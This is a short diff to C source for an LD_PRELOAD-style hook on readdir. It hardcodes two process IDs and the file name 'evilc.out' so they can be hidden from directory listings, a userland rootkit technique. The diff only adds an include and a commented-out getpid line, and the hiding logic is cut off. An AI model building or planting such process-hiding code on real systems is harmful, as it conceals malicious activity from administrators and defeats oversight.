@@ -6,11 +6,13 @@
 
 #define __USE_GNU
 #include <dlfcn.h>
+#include <unistd.h>
 
 static struct dirent *(*orig_readdir) (DIR *) = NULL;
 static const char* hide_process = "6592";
 static const char* hide_process2 = "6204";
 static const char* hidde_name = "evilc.out";
+//const int pid = getpid();
 
 struct dirent *readdir (DIR * dirp){
    if (orig_readdir == NULL){
